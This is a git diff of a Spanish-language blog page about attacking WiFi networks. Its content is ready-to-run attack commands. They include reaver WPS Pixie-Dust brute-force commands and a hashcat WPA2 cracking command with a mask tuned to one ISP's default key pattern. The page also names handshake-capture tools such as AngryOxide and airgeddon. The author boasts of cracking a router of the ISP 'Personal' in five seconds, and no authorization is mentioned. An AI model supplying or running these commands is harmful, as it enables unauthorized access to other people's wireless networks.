@@ -9,10 +9,10 @@
   <meta property="og:url" content="https://imlauera.github.io/post/atacando_wifis/">
   <meta property="og:site_name" content="Imlauer">
   <meta property="og:title" content="Atacando redes WiFis y explotando vulnerabilidades de computadoras dentro ellas.">
-  <meta property="og:description" content="Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y es para cualquier distro.
-sudo reaver -i wlan0 -b mac_address -c canal -K 1 -Z -vvv Si te falla pasamos a:
-sudo reaver -i wlan0 -b mac_address -c canal -S -N -L -d 10 -r 3:15 -T .5 -vv Hoy saque una de las nuevas de Personal en 5 segundos usando el segundo comando.
-Por favor, SIEMPRE prueben antes ataques via reaver antes de pasar a otros mas complejos.">
+  <meta property="og:description" content="Tools dedicadas a conseguir handshakes: handshaker, airgeddon, bettercap, angryoxide, etc, etc. Incluso hasta pasarlo por pyrit para verificarlo.
+No te hace falta usar espacio de disco almacenando diccionarios. Abris un simple .txt en blanco y dentro le pones
+004?d?d?d?d?d?d?d 014?d?d?d?d?d?d?d Lo guardas como 004y014mas7.hcmask. Despues solo resta correr hashcat.
+hashcat -O --markov-threshold=0 -m 22000 -a 3 mi_hash.HC22000 004y014mas7.hcmask -w Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y es para cualquier distro.">
   <meta property="og:locale" content="es_es">
   <meta property="og:type" content="article">
     <meta property="article:section" content="post">
@@ -25,21 +25,21 @@ Por favor, SIEMPRE prueben antes ataques via reaver antes de pasar a otros mas c
 
   
   <meta itemprop="name" content="Atacando redes WiFis y explotando vulnerabilidades de computadoras dentro ellas.">
-  <meta itemprop="description" content="Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y es para cualquier distro.
-sudo reaver -i wlan0 -b mac_address -c canal -K 1 -Z -vvv Si te falla pasamos a:
-sudo reaver -i wlan0 -b mac_address -c canal -S -N -L -d 10 -r 3:15 -T .5 -vv Hoy saque una de las nuevas de Personal en 5 segundos usando el segundo comando.
-Por favor, SIEMPRE prueben antes ataques via reaver antes de pasar a otros mas complejos.">
+  <meta itemprop="description" content="Tools dedicadas a conseguir handshakes: handshaker, airgeddon, bettercap, angryoxide, etc, etc. Incluso hasta pasarlo por pyrit para verificarlo.
+No te hace falta usar espacio de disco almacenando diccionarios. Abris un simple .txt en blanco y dentro le pones
+004?d?d?d?d?d?d?d 014?d?d?d?d?d?d?d Lo guardas como 004y014mas7.hcmask. Despues solo resta correr hashcat.
+hashcat -O --markov-threshold=0 -m 22000 -a 3 mi_hash.HC22000 004y014mas7.hcmask -w Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y es para cualquier distro.">
   <meta itemprop="datePublished" content="2024-07-21T19:48:09-03:00">
   <meta itemprop="dateModified" content="2024-07-21T19:48:09-03:00">
-  <meta itemprop="wordCount" content="4117">
+  <meta itemprop="wordCount" content="4252">
   <meta itemprop="keywords" content="Atacando,Redes,Ciberseguridad,Vulnerabilidades">
   
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="Atacando redes WiFis y explotando vulnerabilidades de computadoras dentro ellas.">
-  <meta name="twitter:description" content="Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y es para cualquier distro.
-sudo reaver -i wlan0 -b mac_address -c canal -K 1 -Z -vvv Si te falla pasamos a:
-sudo reaver -i wlan0 -b mac_address -c canal -S -N -L -d 10 -r 3:15 -T .5 -vv Hoy saque una de las nuevas de Personal en 5 segundos usando el segundo comando.
-Por favor, SIEMPRE prueben antes ataques via reaver antes de pasar a otros mas complejos.">
+  <meta name="twitter:description" content="Tools dedicadas a conseguir handshakes: handshaker, airgeddon, bettercap, angryoxide, etc, etc. Incluso hasta pasarlo por pyrit para verificarlo.
+No te hace falta usar espacio de disco almacenando diccionarios. Abris un simple .txt en blanco y dentro le pones
+004?d?d?d?d?d?d?d 014?d?d?d?d?d?d?d Lo guardas como 004y014mas7.hcmask. Despues solo resta correr hashcat.
+hashcat -O --markov-threshold=0 -m 22000 -a 3 mi_hash.HC22000 004y014mas7.hcmask -w Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y es para cualquier distro.">
 
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -57,13 +57,17 @@ Por favor, SIEMPRE prueben antes ataques via reaver antes de pasar a otros mas c
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="referrer" content="no-referrer">
   <meta name="author" content="Imlauer.">
-  <meta name="description" content="Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y
-es para cualquier distro.
-sudo reaver -i wlan0 -b mac_address -c canal -K 1 -Z -vvv
-Si te falla pasamos a:
-sudo reaver -i wlan0 -b mac_address -c canal -S -N -L -d 10 -r 3:15 -T .5 -vv
-Hoy saque una de las nuevas de Personal en 5 segundos usando el segundo comando.
-Por favor, SIEMPRE prueben antes ataques via reaver antes de pasar a otros mas complejos.">
+  <meta name="description" content="Tools dedicadas a conseguir handshakes: handshaker, airgeddon, bettercap, angryoxide, etc, etc. Incluso hasta pasarlo por pyrit para verificarlo.
+
+No te hace falta usar espacio de disco almacenando diccionarios.
+Abris un simple .txt en blanco y dentro le pones
+004?d?d?d?d?d?d?d
+014?d?d?d?d?d?d?d
+Lo guardas como 004y014mas7.hcmask. Despues solo resta correr hashcat.
+hashcat -O --markov-threshold=0 -m 22000 -a 3 mi_hash.HC22000  004y014mas7.hcmask -w
+
+Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y
+es para cualquier distro.">
 </head>
 <body><nav class="navbar is-transparent " role="navigation" aria-label="main navigation">
   <div class="navbar-brand">
@@ -126,13 +130,32 @@ Por favor, SIEMPRE prueben antes ataques via reaver antes de pasar a otros mas c
     <section class="section">
       <div class="container">
 <div class="content is-medium">
-  <p>Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y
+  <p>Tools dedicadas a conseguir handshakes: handshaker, airgeddon, bettercap, angryoxide, etc, etc. Incluso hasta pasarlo por pyrit para verificarlo.</p>
+<hr>
+<p>No te hace falta usar espacio de disco almacenando diccionarios.
+Abris un simple .txt en blanco y dentro le pones</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>004?d?d?d?d?d?d?d
+</span></span><span style="display:flex;"><span>014?d?d?d?d?d?d?d
+</span></span></code></pre></div><p>Lo guardas como <code>004y014mas7.hcmask</code>. Despues solo resta correr hashcat.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -O --markov-threshold<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">22000</span> -a <span style="color:#ae81ff">3</span> mi_hash.HC22000  004y014mas7.hcmask -w
+</span></span></code></pre></div><hr>
+<p>Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y
 es para cualquier distro.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo reaver -i wlan0 -b mac_address -c canal -K <span style="color:#ae81ff">1</span> -Z -vvv
 </span></span></code></pre></div><p>Si te falla pasamos a:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo reaver -i wlan0 -b mac_address -c canal -S -N -L -d <span style="color:#ae81ff">10</span> -r 3:15 -T .5 -vv
 </span></span></code></pre></div><p>Hoy saque una de las nuevas de Personal en 5 segundos usando el segundo comando.</p>
 <p>Por favor, SIEMPRE prueben antes ataques via reaver antes de pasar a otros mas complejos.</p>
+<hr>
+<p><a href="https://github.com/Ragnt/AngryOxide">https://github.com/Ragnt/AngryOxide</a></p>
+<p>User Guide: <br>
+<a href="https://github.com/Ragnt/AngryOxide/wiki/1.-User-Guide">https://github.com/Ragnt/AngryOxide/wiki/1.-User-Guide</a></p>
+<p>Es tremendamente explicativa la wiki, como se lanza, las opciones a ejecutar, etc.</p>
+<p>Yo lo dejo corriendo mínimo media hora, mientras va creando un archivo pcapng con el
+nombre que le hemos asignado, los .hc22000 validos conseguidos y un file .kismet.
+Para cortarlo presionamos q y los comprime en un solo .tar.gz. Si el pcapng supera
+los 100 mb, automaticamente comprime ese pero sigue creando uno nuevo.
+pero nada de otro mundo.</p>
 <hr>
 <h4 id="airgeddon-captura-handshakes-rotos-es-mejor-usar-hcxdumptool">Airgeddon captura handshakes rotos es mejor usar hcxdumptool</h4>
 <p>Quizás en un futuro mejore, pero hasta ahora es así.</p>
